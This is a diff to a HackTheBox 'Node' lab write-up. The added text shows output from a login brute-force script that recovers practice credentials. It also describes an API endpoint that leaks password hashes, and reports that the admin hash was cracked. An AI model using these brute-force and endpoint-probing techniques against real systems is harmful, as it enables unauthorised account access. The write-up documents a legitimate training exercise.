@@ -41,8 +41,40 @@ Going to the HTTP site on the Hardoop port shows a budding social media website 
 Running a dirbust against the site can be done by specifying a bad string in the response since every request returns 200, but nothing of any real interest is discovered.  
 There is a login page - I create a script to conduct a wordlist attack on the login form since there is no protection against bruteforce (see loginattack.py).
 ```bash
-
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~/writeups/HackTheBox/HTB_Node]
+└──╼ [★]$ ./loginattack.py 
+[+] Attempting wordlist attack for tom...
+Attempts for tom: 0
+[+] Login - tom:spongebob
+[+] Attempting wordlist attack for mark...
+Attempts for mark: 0
+Attempts for mark: 100
+Attempts for mark: 200
+Attempts for mark: 300
+Attempts for mark: 400
+Attempts for mark: 500
+Attempts for mark: 600
+Attempts for mark: 700
+Attempts for mark: 800
+Attempts for mark: 900
+Attempts for mark: 1000
+Attempts for mark: 1100
+Attempts for mark: 1200
+Attempts for mark: 1300
+Attempts for mark: 1400
+[+] Login - mark:snowflake
+[+] Attempting wordlist attack for rastating...
+Attempts for rastating: 0
+Attempts for rastating: 100
+Attempts for rastating: 200
+Attempts for rastating: 300
+Attempts for rastating: 400
+Attempts for rastating: 500
+...
 ```
+Two sets of credentials are recovered: `tom:spongebob` and `mark:snowflake`.  
+Logging in as these users gives only a single page indicating there is no functionality for non-admin users. From here it can be concluded that these users are a dead end.
+  
 Taking a look at the site in Burpsuite, the pages are retrieving information from several endpoints. One is used to the the list of latest users: `/api/users/latest`.  
 By changing this to `/api/users` the response returns a list of users and their password hashes.
 ```bash
@@ -75,3 +107,7 @@ By changing this to `/api/users` the response returns a list of users and their 
   }
 ]
 ```
+Searching online for the admin's hash completes a set of valid admin credentials: `myP14ceAdm1nAcc0uNT:manchester`.
+
+### 3. Log in to the admin page
+
